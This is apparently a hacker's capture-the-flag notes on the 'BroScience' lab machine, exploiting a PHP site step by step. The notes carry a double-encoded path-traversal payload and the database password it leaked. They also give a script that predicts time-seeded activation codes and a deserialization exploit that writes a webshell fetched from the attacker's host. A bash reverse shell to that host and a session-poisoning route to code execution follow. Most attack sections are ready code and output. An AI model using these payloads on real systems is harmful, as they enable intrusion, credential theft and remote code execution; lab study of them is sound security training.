
# Nmap Scan


```
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 df:17:c6:ba:b1:82:22:d9:1d:b5:eb:ff:5d:3d:2c:b7 (RSA)
|   256 3f:8a:56:f8:95:8f:ae:af:e3:ae:7e:b8:80:f6:79:d2 (ECDSA)
|_  256 3c:65:75:27:4a:e2:ef:93:91:37:4c:fd:d9:d4:63:41 (ED25519)
80/tcp  open  http     ==🔴Apache httpd 2.4.54==
|_http-server-header: Apache/2.4.54 (Debian)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to https://broscience.htb/
443/tcp open  ssl/http Apache httpd 2.4.54 ((Debian))
|_http-server-header: Apache/2.4.54 (Debian)
| ssl-cert: Subject: commonName=broscience.htb/organizationName=BroScience/countryName=AT
| Issuer: commonName=broscience.htb/organizationName=BroScience/countryName=AT
| Public Key type: rsa
| Public Key bits: 4096
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-07-14T19:48:36
| Not valid after:  2023-07-14T19:48:36
| MD5:     5328 ddd6 2f34 29d1 1d26 ae8a 68d8 6e0c
| SHA-1:   2056 8d0d 9e41 09cd e5a2 2021 fe3f 349c 40d8 d75b
|_SHA-256: 06a0 9f14 d1c8 3859 5d46 50c5 7300 95bd 7983 58f2 b66e e43c c9d1 20be dc6e bd5f
|_ssl-date: TLS randomness does not represent time
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: BroScience : Home
| tls-alpn: 
|_  http/1.1
Service Info: Host: broscience.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

server runs php

# FeroxBuster dir scan

```
Nothing interesting here!
```



# Port (80)

Interesting 
we found the admin email

![[Pasted image 20261014100957.png]]


error while tryn to login in 

![[Pasted image 20261014101134.png]]

userenmueration allowed

![[Pasted image 20261014101221.png]]

LFI?


![[Pasted image 20261014103506.png]]


THIS MOTHERFUCKER needed a double url encoding to work ;)

payload that worked

```
GET /includes/img.php?path=%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%36%35%25%37%34%25%36%33%25%32%66%25%37%30%25%36%31%25%37%33%25%37%33%25%37%37%25%36%34 HTTP/1.1
```

### Files that I enumerated 
```
# System enumeration
../../../../etc/passwd
../../../../proc/self/environ          # leaked env vars including CRON_BYPASS_TOKEN
../../../../etc/apache2/sites-enabled/000-default.conf  # confirmed web root + log paths

# PHP config
../../../../etc/php/7.4/apache2/php.ini   # confirmed allow_url_include=Off

# App source code (web root confirmed as /var/www/html)
../../../../var/www/html/login.php
../../../../var/www/html/register.php
../../../../var/www/html/activate.php
../../../../var/www/html/includes/utils.php
../../../../var/www/html/includes/db_connect.php
```

**Methodology note:** When LFI exists, always read in this order:

1. `/etc/passwd` → confirm traversal depth
2. `proc/self/environ` → leaked secrets, paths, user info
3. Apache config → confirm web root, log paths
4. `php.ini` → understand what wrappers/functions are available
5. App source code → find the real vuln


etc/passwd
```
HTTP/1.1 200 OK
Date: Wed, 14 Oct 2026 07:46:53 GMT
Server: Apache/2.4.54 (Debian)
Content-Length: 2235
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: image/png

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
tss:x:103:109:TPM software stack,,,:/var/lib/tpm:/bin/false
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:105:111:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:106:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
rtkit:x:107:115:RealtimeKit,,,:/proc:/usr/sbin/nologin
sshd:x:108:65534::/run/sshd:/usr/sbin/nologin
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
avahi:x:110:116:Avahi mDNS daemon,,,:/run/avahi-daemon:/usr/sbin/nologin
speech-dispatcher:x:111:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false
pulse:x:112:118:PulseAudio daemon,,,:/run/pulse:/usr/sbin/nologin
saned:x:113:121::/var/lib/saned:/usr/sbin/nologin
colord:x:114:122:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
geoclue:x:115:123::/var/lib/geoclue:/usr/sbin/nologin
Debian-gdm:x:116:124:Gnome Display Manager:/var/lib/gdm3:/bin/false
bill:x:1000:1000:bill,,,:/home/bill:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
postgres:x:117:125:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
_laurel:x:998:998::/var/log/laurel:/bin/false
```




![[Pasted image 20261014104746.png]]

viewing the vhost conf file


![[Pasted image 20261014110306.png]]

found the php version 

```
../../../../../../../../../../etc/php/7.4/apache2/php.ini
```



![[Pasted image 20261014112130.png]]
```

allow_url_include = Off
allow_url_fopen = On
disable_functions = pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,pcntl_unshare,
```



![[Pasted image 20261014114158.png]]

found credentials for the db


```
<?php
$db_host = "localhost";
$db_port = "5432";
$db_name = "broscience";
$db_user = "dbuser";
$db_pass = "RangeOfMotion%777";
$db_salt = "NaCl";

$db_conn = pg_connect("host={$db_host} port={$db_port} dbname={$db_name} user={$db_user} password={$db_pass}");

if (!$db_conn) {
    die("<b>Error</b>: Unable to connect to database");
}
?>
```



![[Pasted image 20261014174338.png]]


# Vuln 2: Insecure deserialization (RCE)
```

$up = unserialize(base64_decode($_COOKIE['user-prefs']));  # user-controlled input

class AvatarInterface {
    public function __wakeup() {
        $a = new Avatar($this->imgPath);
        $a->save($this->tmp);   # file_get_contents($tmp) writes to $imgPath
    }
}

```

`__wakeup()` fires automatically on `unserialize()` — attacker controls `$tmp` (fetch URL) and `$imgPath` (write destination).

![[Pasted image 20261014174404.png]]

# Account Activation — PRNG Attack

**Why it worked:** PHP’s `srand(time())` uses Unix timestamp as seed. Timestamps only change once per second — so there are only ~10 possible codes per second window.

**The attack:**

```
<?php
$chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
$server_time = intval($argv[1]);
for ($t = $server_time - 60; $t <= $server_time + 60; $t++) {
    srand($t);
    $code = "";
    for ($i = 0; $i < 32; $i++) {
        $code .= $chars[rand(0, strlen($chars) - 1)];
    }
    echo $code . "\n";
}

```

### Workflow


```
# 1. Register account — grab Date: header from response
# 2. Convert to Unix timestamp
date -d "Wed, 14 Oct 2026 09:57:57 GMT" +%s
# → 1791971877

# 3. Generate codes
php codes.php 1791971877 2>/dev/null | tee codes.txt

# 4. Fuzz activation endpoint
ffuf -w codes.txt \
     -u "https://broscience.htb/activate.php?code=FUZZ" \
     --fs 1256
```


# Foothold

AvatarInterface::__wakeup() fires on unserialize()
→ creates Avatar($this->imgPath)
→ Avatar::save($this->tmp) calls file_get_contents($tmp)
→ fetches URL you control
→ writes content to $imgPath you control
→ webshell lands on disk

```
<?php
class Avatar {
    public $imgPath;
    public function __construct($imgPath) {
        $this->imgPath = $imgPath;
    }
    public function save($tmp) {
        $f = fopen($this->imgPath, "w");
        fwrite($f, file_get_contents($tmp));
        fclose($f);
    }
}

class AvatarInterface {
    public $tmp;
    public $imgPath;
    public function __wakeup() {
        $a = new Avatar($this->imgPath);
        $a->save($this->tmp);
    }
}

$obj = new AvatarInterface();
$obj->tmp = "http://10.10.14.100:8080/shell.php";
$obj->imgPath = "/var/www/html/shell.php";
echo base64_encode(serialize($obj));
```


### Step 2: Serve webshell

```
`echo '<?php system($_GET["cmd"]); ?>' > shell.php`
`python3 -m http.server 8080`

```


### Step 3: Trigger deserialization

```
# Set user-prefs cookie to your base64 payload
# Make any authenticated request → __wakeup() fires
```

Execute

```
https://broscience.htb/shell.php?cmd=id
# → uid=33(www-data)

# Upgrade to reverse shell
https://broscience.htb/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.100/4444+0>%261'
```

# Second technique to solve this box


```
User logs in → PHP creates session file on disk:
/var/lib/php/sessions/sess_<PHPSESSID>

Content looks like:
username|s:5:"filip";theme|s:5:"light";role|s:4:"user";
```

The session file is in plain text, and if any value in it comes from user input without sanitization, you can write php code into it

PHPSESSID=aei60duud8ihqp67autqvhrabq , this is our cookie for this example, we inject a php code `<?php system($_GET["cmd"]); ?>`  inside the theme parameter , then we verifty that our session file is writeable/readable.

```

GET /includes/img.php?path=..%252f..%252f..%252f..%252f..%252fvar%252flib%252fphp%252fsessions%252fsess_aei60duud8ihqp67autqvhrabq
```

Session file content should now contain your payload, 

```
username|s:5:"filip";theme|s:29:"<?php system($_GET["cmd"]); ?>";
```
now we include session file via LFI + pass command to it

```
GET /includes/img.php?path=..%252f..%252f..%252f..%252f..%252fvar%252flib%252fphp%252fsessions%252fsess_aei60duud8ihqp67autqvhrabq&cmd=id
```


##### Internal service enumeration
```
www-data@broscience:/var/www/html/includes$ ss -tulpn
ss -tulpn
Netid State  Recv-Q Send-Q Local Address:Port  Peer Address:PortProcess
udp   UNCONN 0      0            0.0.0.0:40859      0.0.0.0:*          
udp   UNCONN 0      0            0.0.0.0:68         0.0.0.0:*          
udp   UNCONN 0      0            0.0.0.0:5353       0.0.0.0:*          
udp   UNCONN 0      0               [::]:5353          [::]:*          
udp   UNCONN 0      0               [::]:52596         [::]:*          
tcp   LISTEN 0      128          0.0.0.0:22         0.0.0.0:*          
tcp   LISTEN 0      244        127.0.0.1:5432       0.0.0.0:*          
tcp   LISTEN 0      511                *:80               *:*          
tcp   LISTEN 0      128             [::]:22            [::]:*          
tcp   LISTEN 0      511                *:443              *:*          

```

these hashes were salted, we needed to specifiy where the salt was placed it order for hashcat or john to crack it

![[Pasted image 20261014195149.png]]